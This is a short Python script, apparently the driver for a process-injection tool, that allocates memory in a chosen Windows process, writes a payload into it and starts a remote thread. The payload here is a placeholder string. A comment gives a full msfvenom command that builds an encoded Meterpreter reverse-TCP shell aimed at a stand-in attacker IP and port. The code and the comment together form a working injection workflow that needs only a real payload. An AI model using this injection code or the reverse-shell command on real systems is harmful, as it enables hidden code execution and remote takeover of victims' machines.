from process_injector import ProcessInjector
from argparse import ArgumentParser

if __name__ == "__main__":
   parser = ArgumentParser() 
   parser.add_argument(
        "-p", "--pid",
        action="store_true",
        help="PROC will be a PID instead of a process name"
    )
   parser.add_argument("PROC", help="the target process")

   args = parser.parse_args()
   
   # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] EXITFUNC=thread -f python –e x86/shikata_ga_nai
   payload = "Testing"
   
   with ProcessInjector(args.PROC, pid=args.pid) as ps_handle:
       # Allocating memory in target process with VirtualAllocEx
       base_addr = ps_handle.virtual_alloc_ex(len(payload))
       print(f"Base Address @ {base_addr}")
       print("[+] Writing data into allocated memory...")
       ps_handle.write_process_memory(payload, len(payload))
       print("[+] Creating remote thread...")
       ps_handle.create_remote_thread()
       print("[+] Remote process memory injection Successful ...")
